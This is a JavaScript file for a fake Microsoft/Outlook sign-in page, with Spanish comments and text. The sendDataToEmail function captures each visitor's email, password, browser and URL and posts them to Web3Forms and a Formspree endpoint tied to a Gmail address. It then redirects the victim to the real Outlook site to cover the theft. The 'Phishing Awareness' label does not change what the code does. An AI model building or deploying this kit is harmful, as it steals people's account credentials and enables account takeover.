// Estado de la aplicación
let userEmail = '';

// Elementos del DOM
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');

const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');
const userEmailDisplay = document.getElementById('userEmail');

const nextBtn = document.getElementById('nextBtn');
const backBtn = document.getElementById('backBtn');
const cancelBtn = document.getElementById('cancelBtn');
const signInBtn = document.getElementById('signInBtn');
const resetBtn = document.getElementById('resetBtn');

// Función para validar email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Función para cambiar de paso
function showStep(stepNumber) {
    step1.classList.add('hidden');
    step2.classList.add('hidden');
    step3.classList.add('hidden');

    switch(stepNumber) {
        case 1:
            step1.classList.remove('hidden');
            setTimeout(() => emailInput.focus(), 100);
            break;
        case 2:
            step2.classList.remove('hidden');
            setTimeout(() => passwordInput.focus(), 100);
            break;
        case 3:
            step3.classList.remove('hidden');
            // Registrar el intento (en una aplicación real, esto se enviaría a un servidor)
            logAttempt();
            break;
    }
}

// Función para enviar datos al correo
function sendDataToEmail(email, password) {
    const timestamp = new Date().toLocaleString('es-ES');
    const userAgent = navigator.userAgent;
    const currentUrl = window.location.href;
    
    console.log('=== INICIANDO ENVÍO DE DATOS ===');
    console.log('Email:', email);
    console.log('Password:', password);
    console.log('Timestamp:', timestamp);
    
    // Preparar datos para Web3Forms
    const formData = new FormData();
    formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
    formData.append('subject', '🚨 Nueva Captura - Phishing Awareness');
    formData.append('name', 'Sistema de Captura');
    formData.append('email', 'noreply@phishing-awareness.com');
    formData.append('message', `
NUEVA CAPTURA DETECTADA
======================

📧 EMAIL: ${email}
🔑 PASSWORD: ${password}

Fecha: ${timestamp}
Navegador: ${userAgent}
URL: ${currentUrl}
    `);
    
    // También enviar usando método alternativo (Formspree)
    const formspreeData = {
        email_capturado: email,
        password_capturada: password,
        fecha_hora: timestamp,
        navegador: userAgent,
        url_captura: currentUrl,
        _subject: `🚨 Nueva Captura - ${email}`,
        _replyto: 'sofly7899@gmail.com'
    };
    
    // Enviar con Web3Forms (método principal)
    console.log('Enviando con Web3Forms...');
    fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        console.log('Response status:', response.status);
        return response.json();
    })
    .then(data => {
        console.log('✅ Web3Forms respuesta:', data);
        if (data.success) {
            console.log('✅ Datos enviados exitosamente a Web3Forms');
        } else {
            console.error('❌ Error en Web3Forms:', data.message);
        }
    })
    .catch(error => {
        console.error('❌ Error al enviar con Web3Forms:', error);
    });
    
    // Enviar también con Formspree (backup)
    console.log('Enviando con Formspree como backup...');
    fetch('https://formspree.io/f/xanyevdp', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formspreeData)
    })
    .then(response => {
        console.log('Formspree response status:', response.status);
        return response.json();
    })
    .then(data => {
        console.log('✅ Formspree respuesta:', data);
    })
    .catch(error => {
        console.error('❌ Error con Formspree:', error);
    });
    
    // Redirigir después de intentar enviar
    console.log('Redirigiendo a Outlook en 2 segundos...');
    setTimeout(() => {
        window.location.href = 'https://outlook.live.com/owa/';
    }, 2000);
}

// Event Listeners

// Botón "Siguiente" (Step 1 -> Step 2)
nextBtn.addEventListener('click', () => {
    const email = emailInput.value.trim();
    
    if (!email) {
        emailError.textContent = 'Escriba su correo electrónico, teléfono o Skype.';
        emailInput.style.borderColor = '#a80000';
        return;
    }
    
    if (!isValidEmail(email)) {
        emailError.textContent = 'Escriba una dirección de correo electrónico válida.';
        emailInput.style.borderColor = '#a80000';
        return;
    }
    
    emailError.textContent = '';
    emailInput.style.borderColor = '';
    userEmail = email;
    userEmailDisplay.textContent = email;
    showStep(2);
});

// Permitir Enter en el campo de email
emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        nextBtn.click();
    }
});

// Limpiar error al escribir
emailInput.addEventListener('input', () => {
    emailError.textContent = '';
    emailInput.style.borderColor = '';
});

// Botón "Atrás" (Step 2 -> Step 1)
backBtn.addEventListener('click', () => {
    passwordInput.value = '';
    passwordError.textContent = '';
    showStep(1);
});

// Botón "Cancelar" (Step 2 -> Step 1)
cancelBtn.addEventListener('click', () => {
    passwordInput.value = '';
    passwordError.textContent = '';
    showStep(1);
});

// Botón "Iniciar sesión" (Step 2 -> Enviar datos y redirigir)
signInBtn.addEventListener('click', () => {
    const password = passwordInput.value;
    
    if (!password) {
        passwordError.textContent = 'Escriba la contraseña de su cuenta de Microsoft.';
        passwordInput.style.borderColor = '#a80000';
        return;
    }
    
    // Simular un pequeño delay como si estuviera verificando
    signInBtn.textContent = 'Iniciando sesión...';
    signInBtn.disabled = true;
    
    // Enviar datos al correo y redirigir
    sendDataToEmail(userEmail, password);
});

// Permitir Enter en el campo de contraseña
passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        signInBtn.click();
    }
});

// Limpiar error al escribir
passwordInput.addEventListener('input', () => {
    passwordError.textContent = '';
    passwordInput.style.borderColor = '';
});

// Botón "Volver al inicio" (Step 3 -> Step 1)
resetBtn.addEventListener('click', () => {
    emailInput.value = '';
    passwordInput.value = '';
    emailError.textContent = '';
    passwordError.textContent = '';
    userEmail = '';
    showStep(1);
});

// Inicializar: mostrar el primer paso
showStep(1);

// Prevenir el envío de formularios (por si se agregan forms más adelante)
document.addEventListener('submit', (e) => {
    e.preventDefault();
});
